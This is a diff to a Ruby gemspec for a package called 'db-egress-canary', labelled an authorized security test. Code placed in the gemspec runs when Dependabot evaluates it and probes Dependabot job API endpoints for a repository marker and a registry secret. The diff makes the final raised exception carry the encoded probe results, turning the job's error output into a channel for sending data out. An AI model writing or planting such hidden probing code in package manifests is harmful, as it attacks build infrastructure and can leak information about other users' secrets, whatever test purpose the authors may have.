@@ -36,18 +36,27 @@ def bounded_probe(label, base_url, job_id, endpoint)
 
   repo_match = marker_match?(body, 32, REPO_MARKER_SHA256)
   secret_match = marker_match?(body, 64, REGISTRY_SECRET_SHA256)
+  sanitized = {
+    label: label,
+    status: status,
+    length: body.bytesize,
+    sha: Digest::SHA256.hexdigest(body),
+    repo_match: repo_match,
+    secret_match: secret_match,
+    error: error_class
+  }
   warn format(
     "CODEX_DB_BINDING label=%<label>s status=%<status>d length=%<length>d " \
       "sha256=%<sha>s repo_marker_match=%<repo>s secret_match=%<secret>s error=%<error>s",
     label: label,
     status: status,
-    length: body.bytesize,
-    sha: Digest::SHA256.hexdigest(body),
+    length: sanitized[:length],
+    sha: sanitized[:sha],
     repo: repo_match,
     secret: secret_match,
     error: error_class
   )
-  [repo_match, secret_match]
+  sanitized
 end
 
 if ENV["DEPENDABOT_API_URL"] && ENV["DEPENDABOT_JOB_ID"]
@@ -77,15 +86,28 @@ if ENV["DEPENDABOT_API_URL"] && ENV["DEPENDABOT_JOB_ID"]
   ]
   warn format(
     "CODEX_DB_BINDING summary repo_marker_matches=%<repo>d secret_matches=%<secret>d requests=6",
-    repo: results.count { |repo_match, _secret_match| repo_match },
-    secret: results.count { |_repo_match, secret_match| secret_match }
+    repo: results.count { |result| result[:repo_match] },
+    secret: results.count { |result| result[:secret_match] }
   )
-  raise "CODEX_DEPENDABOT_OBJECT_BINDING_COMPLETE"
+  encoded_results = results.map do |result|
+    format(
+      "%<label>s,status=%<status>d,length=%<length>d,sha256=%<sha>s," \
+        "repo_marker_match=%<repo>s,secret_match=%<secret>s,error=%<error>s",
+      label: result[:label],
+      status: result[:status],
+      length: result[:length],
+      sha: result[:sha],
+      repo: result[:repo_match],
+      secret: result[:secret_match],
+      error: result[:error]
+    )
+  end.join(";")
+  raise "CODEX_DB_BINDING_RESULTS #{encoded_results}"
 end
 
 Gem::Specification.new do |spec|
   spec.name = "db-egress-canary"
-  spec.version = "2.0.2"
+  spec.version = "2.0.3"
   spec.summary = "Synthetic Dependabot update-job object-binding fixture"
   spec.authors = ["Authorized security test"]
   spec.files = ["lib/db_egress_canary.rb"]
